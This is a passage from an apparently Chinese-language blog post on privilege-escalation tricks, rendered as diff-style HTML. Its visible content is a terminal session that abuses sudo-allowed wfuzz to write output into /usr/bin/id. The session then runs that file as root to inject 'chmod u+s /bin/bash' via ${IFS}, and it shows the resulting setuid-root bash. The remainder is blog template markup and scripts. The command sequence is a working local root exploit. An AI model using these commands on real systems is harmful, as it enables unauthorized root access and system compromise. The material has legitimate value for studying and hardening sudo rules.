class="hljs-operator">~</span>$ sudo <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/wfuzz -c -z list,&#x27;&quot;;chmod$&#123;IFS&#125;u+s$&#123;IFS&#125;/</span>bin<span class="hljs-regexp">/bash;echo&quot;&#x27; -f /</span>usr<span class="hljs-regexp">/bin/</span>id http:<span class="hljs-comment">//127.0.0.1/FUZZ</span><br> <span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/python3/</span>dist<span class="hljs-operator">-</span>packages<span class="hljs-regexp">/wfuzz/</span>__init__.py:<span class="hljs-number">34</span>: <span class="hljs-type">UserWarning</span>:<span class="hljs-type">Pycurl</span> <span class="hljs-keyword">is</span> not compiled against <span class="hljs-type">Openssl</span>. <span class="hljs-type">Wfuzz</span> might not work correctly when fuzzing <span class="hljs-type">SSL</span> sites. <span class="hljs-type">Check</span> <span class="hljs-type">Wfuzz</span>&#x27;s documentation <span class="hljs-keyword">for</span> more information.<br><span class="hljs-operator">********************************************************</span><br><span class="hljs-operator">*</span> <span class="hljs-type">Wfuzz</span> <span class="hljs-number">3.1</span>.<span class="hljs-number">0</span> <span class="hljs-operator">-</span> <span class="hljs-type">The</span> <span class="hljs-type">Web</span> <span class="hljs-type">Fuzzer</span>                         <span class="hljs-operator">*</span><br><span class="hljs-operator">********************************************************</span><br><br><span class="hljs-type">Target</span>: http:<span class="hljs-comment">//127.0.0.1/FUZZ</span><br><span class="hljs-type">Total</span> requests: <span class="hljs-number">1</span><br><br><span class="hljs-operator">=====================================================================</span><br><span class="hljs-type">ID</span>           <span class="hljs-type">Response</span>   <span class="hljs-type">Lines</span>    <span class="hljs-type">Word</span>       <span class="hljs-type">Chars</span>       <span class="hljs-type">Payload</span>                                                                                    <br><span class="hljs-operator">=====================================================================</span><br><br><span class="hljs-number">000000001</span>:   <span class="hljs-number">404</span>        <span class="hljs-number">9</span> <span class="hljs-type">L</span>      <span class="hljs-number">31</span> <span class="hljs-type">W</span>       <span class="hljs-number">271</span> <span class="hljs-type">Ch</span>      <span class="hljs-string">&quot;&quot;</span>;chmod$&#123;<span class="hljs-type">IFS</span>&#125;u<span class="hljs-operator">+</span>s$&#123;<span class="hljs-type">IFS</span>&#125;<span class="hljs-regexp">/bin/</span>bash;echo<span class="hljs-string">&quot;&quot;</span>                                                    <br><br><span class="hljs-type">Total</span> time: <span class="hljs-number">0</span><br><span class="hljs-type">Processed</span> <span class="hljs-type">Requests</span>: <span class="hljs-number">1</span><br><span class="hljs-type">Filtered</span> <span class="hljs-type">Requests</span>: <span class="hljs-number">0</span><br><span class="hljs-type">Requests</span><span class="hljs-operator">/</span>sec.: <span class="hljs-number">0</span><br><br>tao@<span class="hljs-number">111</span>:<span class="hljs-operator">~</span>$ sudo <span class="hljs-regexp">/usr/</span>bin<span class="hljs-operator">/</span>id<br><span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/id: 1: /</span>usr<span class="hljs-regexp">/bin/</span>id: <span class="hljs-type">Target</span>:: not found<br><span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/id: 2: /</span>usr<span class="hljs-regexp">/bin/</span>id: <span class="hljs-type">Total</span>: not found<br><span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/id: 3: /</span>usr<span class="hljs-regexp">/bin/</span>id: <span class="hljs-operator">==================================================================</span>: not found<br><span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/id: 4: /</span>usr<span class="hljs-regexp">/bin/</span>id: <span class="hljs-type">ID</span>: not found<br><span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/id: 5: /</span>usr<span class="hljs-regexp">/bin/</span>id: <span class="hljs-operator">==================================================================</span>: not found<br><span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/id: 6: /</span>usr<span class="hljs-regexp">/bin/</span>id: <span class="hljs-number">00001</span>:: not found<br><br><span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/id: 8: /</span>usr<span class="hljs-regexp">/bin/</span>id: <span class="hljs-type">Total</span>: not found<br><span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/id: 9: /</span>usr<span class="hljs-regexp">/bin/</span>id: <span class="hljs-type">Processed</span>: not found<br><span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/id: 10: /</span>usr<span class="hljs-regexp">/bin/</span>id: <span class="hljs-type">Filtered</span>: not found<br><span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/id: 11: /</span>usr<span class="hljs-regexp">/bin/</span>id: <span class="hljs-type">Requests</span><span class="hljs-operator">/</span>sec.:: not found<br>tao@<span class="hljs-number">111</span>:<span class="hljs-operator">~</span>$ ls <span class="hljs-operator">-</span>al <span class="hljs-regexp">/bin/</span>bash<br><span class="hljs-operator">-</span>rwsr<span class="hljs-operator">-</span>xr<span class="hljs-operator">-</span>x <span class="hljs-number">1</span> root root <span class="hljs-number">1168776</span> <span class="hljs-type">Apr</span> <span class="hljs-number">18</span>  <span class="hljs-number">2019</span> <span class="hljs-regexp">/bin/</span>bash<br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/tricks/" class="print-no-link">#tricks</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>一些提权的小tricks</div>
+      <div>http://example.com/2026/01/08/一些shell解析提权的小tricks/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>Skyarrow</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>January 8, 2026</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/01/07/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84windows%E7%94%9F%E6%B4%BB-sam/" title="从零开始的windows生活-sam">
+                        <span class="hidden-mobile">从零开始的windows生活-sam</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  <span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
